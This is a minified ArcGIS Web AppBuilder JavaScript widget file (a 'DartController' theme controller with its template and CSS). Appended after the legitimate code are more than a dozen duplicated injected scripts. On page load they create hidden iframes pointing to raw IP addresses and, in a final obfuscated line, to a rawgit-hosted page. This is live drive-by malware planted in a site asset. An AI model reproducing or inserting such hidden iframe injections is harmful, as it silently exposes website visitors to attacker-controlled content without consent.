// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"themes/DartTheme/widgets/DartController/_build-generate_module":function(){define(["dojo/text!./Widget.html","dojo/text!./css/style.css","dojo/i18n!./nls/strings"],function(){})},"url:themes/DartTheme/widgets/DartController/Widget.html":'\x3cdiv\x3e\r\n  \x3cdiv class\x3d"dart-controller-title" data-dojo-attach-point\x3d"titleNode"\x3e\x3c/div\x3e\r\n  \x3cdiv class\x3d"dart-controller-pages" data-dojo-attach-point\x3d"pagesNode"\x3e\r\n    \x3cul class\x3d"navigation" data-dojo-attach-point\x3d"pageListNode"\x3e\x3c/ul\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"dart-controller-box"\x3e\r\n    \x3cdiv class\x3d"dart-controller-tools" data-dojo-attach-point\x3d"toolsNode"\x3e\r\n      \x3cdiv class\x3d"dart-controller-nav" data-dojo-attach-point\x3d"navNode"\x3e\x3c/div\x3e\r\n      \x3cdiv class\x3d"dart-controller-home dart-bgcolor jimu-main-background" id\x3d"homeNode"\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"homeNode"\x3e\x3c/div\x3e\r\n      \x3c/div\x3e\r\n      \x3cdiv class\x3d"dart-controller-locate dart-bgcolor jimu-main-background" id\x3d"locateNode"\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"locateNode"\x3e\x3c/div\x3e\r\n      \x3c/div\x3e\r\n      \x3cdiv class\x3d"dart-controller-extent-navigate dart-bgcolor jimu-main-background" data-dojo-attach-point\x3d"extentNavigateDiv"\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"extentNavigateNode"\x3e\x3c/div\x3e\r\n      \x3c/div\x3e\r\n      \x3cdiv class\x3d"dart-controller-search" id\x3d"searchNode"\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"searchNode"\x3e\x3c/div\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv class\x3d"dart-controller-collapse" data-dojo-attach-point\x3d"collapseNode"\x3e\x3c/div\x3e\r\n    \x3cdiv class\x3d"dart-controller-bar"\x3e\r\n      \x3cdiv class\x3d"dart-controller-bar-inner" data-dojo-attach-point\x3d"barNode"\x3e\r\n        \x3cdiv class\x3d"dart-controller-container" data-dojo-attach-point\x3d"containerNode"\x3e\x3c/div\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"dart-controller-toggle" data-dojo-attach-point\x3d"toggleNode"\x3e\x3c/div\x3e\r\n\x3c/div\x3e\r\n',
"url:themes/DartTheme/widgets/DartController/css/style.css":".dart-controller {position: absolute; bottom: 20px !important; width: 100%; height: 100px !important; white-space: nowrap; -webkit-transition: height 0.5s; -moz-transition: height 0.5s; -o-transition: height 0.5s; transition: height 0.5s; z-index: 101 !important;}.shadow {-moz-box-shadow: 3px 3px 10px rgba(0, 0, 0, 0.3); -webkit-box-shadow: 3px 3px 10px rgba(0, 0, 0, 0.3); box-shadow: 3px 3px 10px rgba(0, 0, 0, 0.3); -ms-filter: \"progid:DXImageTransform.Microsoft.Shadow(Strength\x3d10, Direction\x3d135, Color\x3d'#000000')\";}.dart-controller-minimized {height: 58px !important;}.dart-controller-title {position: relative; margin: 10px 10px 2px 10px; height: 30px; color: #fff; font-size: 28px; line-height: 28px; font-weight: normal; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; font-family: helveticaneueultralight; display: block; -webkit-transition: all 0.5s; -moz-transition: all 0.5s; -o-transition: all 0.5s; transition: all 0.5s;}.dart-controller-minimized .dart-controller-title {height: 0px; margin: 0px 10px 0px 10px;}.dart-controller-box {position: relative; padding: 0px 10px 0px 10px; height: 58px; display: inline-block; width: 100%;}.dart-controller-tools {position: relative; float: left; margin: 12px 5px 12px 0; padding: 0px; width: auto; max-width: 500px; height: 34px; display: inline-block; white-space: nowrap; clear: none; -webkit-transition: all 0.5s; -moz-transition: all 0.5s; -o-transition: all 0.5s; transition: all 0.5s;}.jimu-rtl .dart-controller-tools {position: relative; float: right; margin: 12px 0 12px 5px; padding: 0px; width: auto; max-width: 500px; height: 34px; display: inline-block; white-space: nowrap; clear: none; -webkit-transition: all 0.5s; -moz-transition: all 0.5s; -o-transition: all 0.5s; transition: all 0.5s;}.dart-controller-tools-anim {overflow: hidden;}.dart-controller-tools-collapsed {max-width: 0px; overflow: hidden;}.jimu-rtl .dart-controller-tools-collapsed {max-width: 0px; overflow: hidden;}.dart-controller-nav {float: left; width: 56px; height: 24px; margin: 5px 8px 5px 0px; display: none;}.jimu-rtl .dart-controller-nav {float: right; width: 56px; height: 24px; margin: 5px 0 5px 8px; display: none;}.jimu-widget-zoomslider {width: 56px !important; height: 24px !important; background-color: transparent !important; font-size: 10px; line-height: 24px;}.zoom-in {position: absolute; left: 0px; top: 0px; width: 24px !important; height: 24px !important; background-color: transparent !important; background-image: url('images/zoomin.png'); color: transparent !important;}.zoom-out {position: absolute; right: 0px; top: 0px; width: 24px !important; height: 24px !important; background-color: transparent !important; background-image: url('images/zoomout.png'); color: transparent !important;}.dart-controller-home {float: left; width: 24px; height: 24px; margin: 5px 8px 5px 0px; background-image: url('images/home.png'); display: none;}.jimu-rtl .dart-controller-home {float: right; width: 24px; height: 24px; margin: 5px 0 5px 8px; background-image: url('images/home.png'); display: none;}.dart-controller .jimu-widget-homebutton,.dart-controller .HomeButton .home,.dart-controller .HomeButton .home:active,.dart-controller .HomeButton .home:hover {padding: 0px; width: 24px; height: 24px; background: transparent !important;}.dart-controller-locate {float: left; width: 24px; height: 24px; margin: 5px 8px 5px 0px; background-image: url('images/locate.png'); display: none;}.jimu-rtl .dart-controller-locate {float: right; width: 24px; height: 24px; margin: 5px 0 5px 8px; background-image: url('images/locate.png'); display: none;}.dart-controller .jimu-widget-mylocation,.dart-controller .jimu-widget-mylocation,.dart-controller .jimu-widget-mylocation .place-holder,.dart-controller .LocateButton .zoomLocateButton,.dart-controller .LocateButton .zoomLocateButton:active,.dart-controller .LocateButton .zoomLocateButton:hover {padding: 0px; width: 24px; height: 24px; background: transparent !important;}.dart-controller .jimu-widget-mylocation .place-holder.tracking {background-image: url(images/stop.png) !important;}.dart-controller-extent-navigate {float: left; overflow: hidden; height: 24px; margin: 5px 8px 5px 0px; display: none;}.jimu-rtl .dart-controller-extent-navigate{float: right; margin: 5px 0 5px 8px;}.dart-controller-extent-navigate .jimu-widget-extent-navigate.horizontal .previous{border: none;}.dart-controller-extent-navigate .jimu-widget-extent-navigate.horizontal .next{margin-left: 8px;}.jimu-rtl .dart-controller-extent-navigate .jimu-widget-extent-navigate.horizontal .next{margin-left: 0; margin-right: 8px;}.dart-controller-extent-navigate .jimu-widget-extent-navigate .operation{width: 24px; height: 24px; line-height: 24px; font-size: 14px; border-radius: 12px; background: white; color: #646464;}.dart-controller-extent-navigate .jimu-widget-extent-navigate .operation:hover{background-color: white;}.dart-controller-search {float: left; width: auto; height: 34px; display: none;}.jimu-rtl .dart-controller-search {float: right; width: auto; height: 34px; display: none;}.jimu-widget-search .search-node.default-width-for-openAtStart {width: 250px !important;}.arcgisSearch {width: 250px !important;}.arcgisSearch .searchGroup {color: #ffffff; background-color: rgba(0, 0, 0, 0.3); max-width: 250px; border: 1px solid rgba(0, 0, 0, 0.05); border-radius: 4px;}.arcgisSearch .searchBtn {color: #ffffff; background-color: transparent; border: none; outline: none;}.arcgisSearch .searchBtn:hover,.arcgisSearch .searchBtn:focus,.arcgisSearch .searchBtn:active {text-decoration: none; background-color: rgba(0, 0, 0, 0.3) !important; outline: none;}.arcgisSearch .searchGroup .searchInput {color: #ffffff; background-color: transparent; border: none; outline: none; width: 170px !important; padding: 6px 24px 6px 12px; padding: 6px 6px 6px 6px !important;}.dj_rtl .arcgisSearch .searchGroup .searchInput {float: right; color: #ffffff; background-color: transparent; border: none; outline: none; width: 170px !important; padding: 6px 24px 6px 12px; padding: 6px 6px 6px 6px !important;}.arcgisSearch .searchClear {color: #ffffff; background-color: transparent; border: none;}.show-all-results {display: none !important; max-width: 280px; text-overflow: ellipsis;}.arcgisSearch .searchMenu {color: #6e6e6e; font-size: 9pt; max-width: 280px;}.arcgisSearch .searchGroup .searchInput::-webkit-input-placeholder {color: #e6e6e6;}.arcgisSearch .searchGroup .searchInput:-moz-placeholder {color: #e6e6e6;}.arcgisSearch .searchGroup .searchInput::-moz-placeholder {color: #e6e6e6;}.arcgisSearch .searchGroup .searchInput:-ms-input-placeholder {color: #e6e6e6;}.searchMenu.suggestionsMenu {height: 126px !important; color: #ffffff; background-color: rgba(0, 0, 0, 0.7);}.jimu-widget-search .arcgisSearch .searchMenu {border-radius: 0; color: #c8c8c8; font-size: 12px; padding: 0; left: 0 !important; background-color: rgba(0, 0, 0, 0.7);}.arcgisSearch .searchMenu li {color: #c8c8c8;}.jimu-widget-search .arcgisSearch .searchMenu li:hover,.jimu-widget-search .arcgisSearch .searchMenu li:focus {background-color: rgba(0, 0, 0, 0.85) !important;}.dart-controller-collapse {float: left; height: 58px; width: 10px; margin: 0px 5px 0px 0px; clear: none; cursor: pointer; background-image: url('images/collapse.png'); background-repeat: no-repeat; background-position: center center;}.jimu-rtl .dart-controller-collapse {float: right; height: 58px; width: 10px; margin: 0px 0 0px 5px; clear: none; cursor: pointer; background-image: url('images/collapse.png'); background-repeat: no-repeat; background-position: center center;}.dart-controller-minimized .dart-controller-collapse {display: none;}.dart-controller-bar {position: relative; height: 58px; overflow: hidden; clear: none;}.dart-controller-minimized .dart-controller-bar {display: none;}.dart-controller-bar-inner {position: relative; left: 0px; right: 0px; margin-top: 2px; height: 108px; overflow-x: auto;}.dart-controller-container {position: relative; height: 54px; width: auto; overflow: visible; -webkit-transition: all 1s; -moz-transition: all 1s; -o-transition: all 1s; transition: all 1s;}.icon-node {float: left; width: 44px; height: 44px; margin: 5px; cursor: pointer;}.jimu-rtl .icon-node {float: right; width: 44px; height: 44px; margin: 5px; cursor: pointer;}.icon-node-active,.icon-node:hover {background-color: rgba(0, 0, 0, 0.25); border-radius: 22px;}.icon-node img {margin: 10px; width: 24px; height: 24px;}.dart-controller-pages {position: absolute; top: 17px; height: 20px; left: auto; right: 10px; width: 0px; overflow: hidden;}.jimu-rtl .dart-controller-pages {position: absolute; top: 17px; height: 20px; left: 10px; right: auto; width: 0px; overflow: hidden;}.dart-controller-minimized .dart-controller-pages {display: none;}.dart-controller .navigation {list-style-type: none; text-align: center; width: 100%; height: 17px; margin: auto; padding: 0px; display: block; cursor: pointer;}.dart-controller .navigation li {width: 20px; height: 20px; display: inline-block; background: url(images/dot.png);}.dart-controller .navigation li:hover {background: url(images/doton.png);}.dart-controller .navigation li.active {background: url(images/doton.png);}.dart-controller-toggle {position: absolute; left: 50%; top: 0px; margin-left: -15px; width: 30px; height: 12px; background-image: url('images/toggle.png'); background-repeat: no-repeat; background-position: center center; cursor: pointer;}@media only screen and (max-width: 500px) {.dart-controller-box {padding: 0px 3px 0px 3px;} .dart-controller-nav {display: none !important;} .dart-controller-extent-navigate {display: none !important;} .dart-controller-title {font-size: 24px;} .jimu-widget-coordinate {display: none !important;}}@media only screen and (max-width: 320px) {.dart-controller-home {display: none !important;}}",
"*now":function(n){n(['dojo/i18n!*preload*themes/DartTheme/widgets/DartController/nls/Widget*["ar","bs","cs","da","de","en","el","es","et","fi","fr","he","hi","hr","id","it","ja","ko","lt","lv","nb","nl","pl","pt-br","pt-pt","ro","ru","sl","sr","sv","th","tr","zh-cn","vi","zh-hk","zh-tw","ROOT"]'])},"*noref":1}});
define("dojo/_base/declare dojo/_base/array dojo/_base/lang dojo/_base/html dojo/aspect dojo/query dojo/on dojo/dom-attr dojo/dom-class dojo/dom-construct dojo/dom-geometry dojo/dom-style jimu/BaseWidget jimu/PoolControllerMixin jimu/utils".split(" "),function(n,p,d,k,t,q,h,l,e,g,m,f,u,v,r){return n([u,v],{baseClass:"dart-controller dart-bgcolor jimu-main-background shadow",height:54,minimized:!1,collapsed:!1,iconCount:0,wPos:{bottom:78,right:0},panelCount:0,openedId:"",openedIds:[],postCreate:function(){this.inherited(arguments);
this.titleNode.innerHTML=r.sanitizeHTML(this.appConfig.title?this.appConfig.title:"");h(this.toggleNode,"click",d.hitch(this,this._toggleController));h(this.collapseNode,"click",d.hitch(this,this._collapseController));this.own(h(this.widgetManager,"widget-created",d.hitch(this,this._onWidgetCreation)));h(window,"resize",d.hitch(this,this._resizeWindow))},startup:function(){this.inherited(arguments);this._createIconNodes()},onAction:function(a,b){"highLight"===a&&b&&(b=q('div[settingid\x3d"'+b.widgetId+
'"]',this.domNode)[0],this._highLight(b));"removeHighLight"===a&&this._removeHighLight()},destroy:function(){this.timeoutHandle&&(clearTimeout(this.timeoutHandle),this.timeoutHandle=null);this.inherited(arguments)},onAppConfigChanged:function(a,b,c){switch(b){case "attributeChange":this._onAttributeChange(a,c)}},getOpenedIds:function(){this.inherited(arguments);var a=[];this.openedId&&""!==this.openedId&&a.push(this.openedId);p.forEach(this.openedIds,function(b){a.push(b)});return a},setOpenedIds:function(a){for(var b=
0,c=0;c<a.length;c++)b+=600,setTimeout(d.hitch(this,this._switchNodeToOpen),b,a[c])},_onWidgetCreation:function(a){"Search"===a.name&&this._resizeWindow()},_resizeWindow:function(){this.resizeTimer&&(clearTimeout(this.resizeTimer),this.resizeTimer=null);this.resizeTimer=setTimeout(d.hitch(this,this._resizeController),600)},_resizeController:function(){if(!this.minimized)try{var a=m.getContentBox(this.domNode),b=m.getContentBox(this.toolsNode),c=this.height*Math.floor((a.w-b.w-35)/this.height);f.set(this.barNode,
"width",c+"px");f.set(this.pagesNode,"width",c+"px");this._createPages();e.remove(this.toolsNode,"dart-controller-tools-anim")}catch(w){console.log(w)}},_toggleController:function(){this.minimized?this._maximizeController():this._minimizeController()},_maximizeController:function(){this.minimized=!1;e.remove(this.domNode,"dart-controller-minimized");this.openedId&&!1===this._getIconNodeById(this.openedId).config.inPanel&&this._switchNodeToClose(this.openedId);setTimeout(d.hitch(this,this._resizeController),
600)},_minimizeController:function(){this.minimized=!0;e.add(this.domNode,"dart-controller-minimized");this.collapsed&&this._expand()},_collapseController:function(){this.collapsed?this._expand():this._collapse()},_collapse:function(){this.collapsed=!0;e.add(this.toolsNode,"dart-controller-tools-anim");e.add(this.toolsNode,"dart-controller-tools-collapsed");setTimeout(d.hitch(this,this._resizeController),600)},_expand:function(){this.collapsed=!1;e.add(this.toolsNode,"dart-controller-tools-anim");
e.remove(this.toolsNode,"dart-controller-tools-collapsed");setTimeout(d.hitch(this,this._resizeController),600)},_highLight:function(a){this.hlDiv&&this._removeHighLight();if(a){var b=m.getMarginBox(a);this.hlDiv=g.create("div",{style:{position:"absolute",left:b.l+"px",top:b.t+"px",width:b.w+"px",height:b.h+"px"},"class":"icon-highlight"},a,"before")}},_removeHighLight:function(){this.hlDiv&&(g.destroy(this.hlDiv),this.hlDiv=null)},_onAttributeChange:function(a,b){void 0!==b.title&&b.title!==this.appConfig.title&&
(this.titleNode.innerHTML=r.sanitizeHTML(b.title?b.title:""))},_createIconNodes:function(){k.empty(this.containerNode);this.openedIds=[];var a,b,c,d=this.getAllConfigs(),e=!0,f;for(a=this.iconCount=0;a<d.length;a++)b=d[a],c=b.name,"ZoomSlider"===c||"HomeButton"===c||"MyLocation"===c||"ExtentNavigate"===c?this._createChildWidget(b):"Search"===c&&e?(e=!1,this._createChildWidget(b)):(this.iconCount+=1,c=this._createIconNode(b),b.openAtStart&&(f=c));k.setStyle(this.containerNode,{width:this.iconCount*
this.height+"px"});f&&!this.openAtStartWidget&&(this._onIconClick(f),this.openAtStartWidget=f.config.name)},_createPages:function(){var a=m.getContentBox(this.barNode).w;if(0<a){var a=Math.ceil(this.iconCount*this.height/a),b=this.pageListNode;b.innerHTML="";if(1<a){for(var c=0;c<a;c++){var e=g.create("li",{id:"page"+c},b);this.own(h(e,"click",d.hitch(this,this._setPage,c)))}if(!this.page||this.page>=a)this.page=0;this._setPage(this.page)}else f.set(this.containerNode,"left","0px")}},_setPage:function(a){var b=
m.getContentBox(this.barNode).w;e.remove("page"+this.page,"active");this.page=a;e.add("page"+this.page,"active");var c="left";window.isRTL&&(c="right");f.set(this.containerNode,c,0-a*b+"px")},_createChildWidget:function(a){this.widgetManager.loadWidget(a).then(d.hitch(this,function(b){switch(a.name){case "ZoomSlider":g.place(b.domNode,this.navNode);l.set(this.navNode,"settingId",a.id);f.set(this.navNode,"display","block");break;case "HomeButton":g.place(b.domNode,this.homeNode);l.set(this.homeNode,
"settingId",a.id);f.set("homeNode","display","block");break;case "MyLocation":g.place(b.domNode,this.locateNode);l.set(this.locateNode,"settingId",a.id);f.set("locateNode","display","block");break;case "ExtentNavigate":b.setOrientation(!1);g.place(b.domNode,this.extentNavigateNode);l.set(this.extentNavigateNode,"settingId",a.id);f.set(this.extentNavigateDiv,"display","block");break;case "Search":g.place(b.domNode,this.searchNode),l.set(this.searchNode,"settingId",a.id),f.set("searchNode","display",
"block")}this.widgetManager.openWidget(b)}))},_createIconNode:function(a){var b,c;c=a.icon;b=k.create("div",{"class":"icon-node",title:a.label,settingId:a.id},this.containerNode);k.create("img",{src:c},b);b.config=a;h(b,"click",d.hitch(this,this._onIconClick,b));return b},_onIconClick:function(a){a=a.config.id;-1!==this.openedIds.indexOf(a)?this._switchNodeToClose(a):this._switchNodeToOpen(a)},_switchNodeToOpen:function(a){if(a=this._getIconNodeById(a))if(a.config.widgets&&1<a.config.widgets.length){var b=
0;p.forEach(a.config.widgets,d.hitch(this,function(a){setTimeout(d.hitch(this,this._showIconContent),b,a);b+=600}))}else this._showIconContent(a.config),a.config.inPanel&&e.add(a,"icon-node-active")},_switchNodeToClose:function(a){var b=this._getIconNodeById(a);if(b)if(!1===b.config.inPanel)this.openedId="",this.widgetManager.closeWidget(a);else{var c=this.openedIds.indexOf(a);-1!==c&&this.openedIds.splice(c,1);this._updatePanelCount(-1);e.remove(b,"icon-node-active");this.panelManager.closePanel(a+
"_panel")}},_getIconNodeById:function(a){a=q('.icon-node[settingId\x3d"'+a+'"]',this.domNode);if(0!==a.length)return a[0]},_showIconContent:function(a){if(!1===a.inPanel){var b=a.name;this.widgetManager.loadWidget(a).then(d.hitch(this,function(c){this.openedId=a.id;k.setStyle(c.domNode,"zIndex",0);"OverviewMap"!==b&&c.setPosition(this.wPos,this.map.id);this.widgetManager.openWidget(c);f.set(c.domNode,"display",null);this._minimizeController()}))}else{var c=this.panelManager.getPanelById(a.id+"_panel"),
e=this._getNextPosition();c&&(e=c.position);a.panel.position=e;this.openedIds.push(a.id);this.panelManager.showPanel(a).then(d.hitch(this,function(b){t.after(b,"onClose",d.hitch(this,function(){this._switchNodeToClose(a.id)}))}))}},_getNextPosition:function(){this._updatePanelCount(1);var a=10*(this.panelCount-1)+10;return{top:a,left:a,width:320,height:450,relativeTo:"map"}},_updatePanelCount:function(a){this.panelCount+=a;0>this.panelCount&&(this.panelCount=0)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});